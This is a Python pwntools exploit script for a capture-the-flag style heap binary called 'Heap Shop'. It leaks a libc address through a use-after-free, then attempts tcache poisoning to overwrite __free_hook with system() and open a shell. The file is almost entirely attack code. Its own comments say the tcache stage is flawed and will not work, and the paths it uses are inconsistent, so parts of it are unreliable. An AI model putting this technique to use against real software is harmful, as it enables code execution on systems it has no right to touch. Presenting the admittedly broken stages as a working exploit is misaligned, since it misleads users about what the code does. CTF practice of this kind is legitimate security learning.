#!/usr/bin/env python3
# solver.py
#
# This script exploits the Heap Shop binary to gain an interactive shell.
# It chains a Use-After-Free vulnerability to leak a libc address with
# a Tcache Poisoning attack to achieve arbitrary code execution.
#
# To Run:
# 1. Compile the C code: gcc -no-pie -o heap_shop heap_shop.c
#    (The -no-pie flag is important to keep the binary's addresses static)
#
# 2. Find the target libc:
#    ldd ./heap_shop
#    (This will show you which libc.so.6 is being used, e.g., /lib/x86_64-linux-gnu/libc.so.6)
#
# 3. Update the `libc = ELF(...)` path below with the correct path.
#
# 4. Run this script: python3 solver.py

from pwn import *

# --- Exploit Configuration ---
# Set the context for the binary architecture
context.binary = elf = ELF('./bin/heapshop')
# Set the path to the libc library used by the binary
# You can find this by running `ldd ./heap_shop`
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

# --- Process Interaction Functions ---

def alloc(p, index, size, data):
    """Sends the allocation command to the vulnerable program."""
    p.sendlineafter(b'Select an option: ', b'1')
    p.sendlineafter(b'Enter item index', str(index).encode())
    p.sendlineafter(b'Enter size', str(size).encode())
    p.sendlineafter(b'Enter item data: ', data)
    log.info(f"Allocated chunk at index {index} with size {size}")

def delete(p, index):
    """Sends the delete command, freeing the chunk."""
    p.sendlineafter(b'Select an option: ', b'2')
    p.sendlineafter(b'Enter item index', str(index).encode())
    log.info(f"Deleted chunk at index {index}")

def show(p, index):
    """Sends the show command to view a chunk's data."""
    p.sendlineafter(b'Select an option: ', b'3')
    p.sendlineafter(b'Enter item index', str(index).encode())
    log.info(f"Showing chunk at index {index}")
    # Receive until the menu prompt to get all the output
    p.recvuntil(b"End of item.\n")
    # The leaked data is between the "Show Item" header and "End of item"
    leak = p.recvuntil(b"=====", drop=True).strip()
    return leak

# --- Main Exploit Logic ---

def main():
    # Start the process. Use GDB for debugging if needed.
    # p = gdb.debug(elf.path, '''
    #     b show
    #     continue
    # ''')
    p = process(elf.path)

    # --- Stage 1: Leak Libc Address using Use-After-Free ---
    log.info("--- Stage 1: Leaking Libc Address ---")
    
    # Allocate a chunk large enough to land in the unsorted bin when freed.
    # This is the standard technique to leak a libc address.
    alloc(p, 0, 0x420, b'A'*8)
    delete(p, 0)
    
    # Use the UAF to show the freed chunk. The first 8 bytes of a freed
    # unsorted bin chunk contain a pointer into libc's main_arena.
    leaked_data = show(p, 0)
    main_arena_leak = u64(leaked_data.ljust(8, b'\x00'))
    log.success(f"Leaked address from main_arena: {hex(main_arena_leak)}")
    
    # --- FIX FOR THE TRACEBACK & 'main_arena not in libc' ---
    # You are correct, main_arena is not an exported symbol. The leaked address
    # is an offset from the start of the main_arena struct, which itself is at
    # a fixed offset from the base of libc. We need to find the offset from
    # our leak to the base of libc for your specific libc version.
    #
    # HOW TO FIND THE OFFSET:
    # 1. Run the program in GDB until the leak: `gdb ./heap_shop`
    # 2. `b show` -> `r` -> perform the alloc and delete steps.
    # 3. When `show` is hit, `vmmap` (if using pwndbg) to find libc base.
    # 4. `c` to continue. The leaked address will be printed.
    # 5. Your offset is: `offset = leaked_address - libc_base_address`
    #
    # For libc-2.31 (Ubuntu 20.04), this offset is typically 0x1ecbe0.
    # For libc-2.27 (Ubuntu 18.04), it's 0x3ebc40.
    # YOU MUST REPLACE THE VALUE BELOW WITH THE CORRECT ONE FOR YOUR SYSTEM.
    LIBC_LEAK_OFFSET = 0x1ecbe0 
    
    libc_base = main_arena_leak - LIBC_LEAK_OFFSET
    libc.address = libc_base
    
    # Check if the calculation was successful
    if libc.address < 0:
        log.error("Failed to calculate libc base address. It is negative.")
        log.error("You MUST find and set the correct LIBC_LEAK_OFFSET for your system.")
        return

    log.success(f"Calculated libc base: {hex(libc.address)}")
    log.success(f"Address of __free_hook: {hex(libc.symbols['__free_hook'])}")
    log.success(f"Address of system(): {hex(libc.symbols['system'])}")

    # --- Stage 2: Tcache Poisoning to Overwrite __free_hook ---
    log.info("--- Stage 2: Tcache Poisoning for Arbitrary Write ---")

    # NOTE: The logic for Tcache Poisoning is also flawed given the binary's constraints.
    # A standard tcache attack requires manipulating the `fd` (forward) pointer of a
    # freed chunk. This requires a Use-After-Free WRITE vulnerability (e.g., an `edit`
    # function) or a true double free. The `alloc` function here does not allow writing
    # to a freed chunk, it allocates a new one.
    # The INTENDED exploit path for this binary likely involves using the OTHER bug:
    # `arr[amt] = '\x00'`, which is an out-of-bounds write into the .bss section.
    # The logic below is a placeholder for the standard tcache poisoning pattern.

    alloc(p, 0, 0x40, b'B'*8)
    delete(p, 0)
    
    log.warning("The following tcache poisoning logic is for demonstration and will NOT work on this binary.")
    payload = p64(libc.symbols['__free_hook'])
    alloc(p, 0, 0x40, payload) # This does not do what is intended.
    
    alloc(p, 0, 0x40, b"C"*8)
    
    log.info("Attempting to allocate chunk at __free_hook")
    alloc(p, 0, 0x40, p64(libc.symbols['system']))

    # --- Stage 3: Get Shell ---
    log.info("--- Stage 3: Triggering Hook for Shell ---")
    
    alloc(p, 0, 0x20, b"/bin/sh\x00")
    delete(p, 0)
    
    p.interactive()

if __name__ == "__main__":
    main()
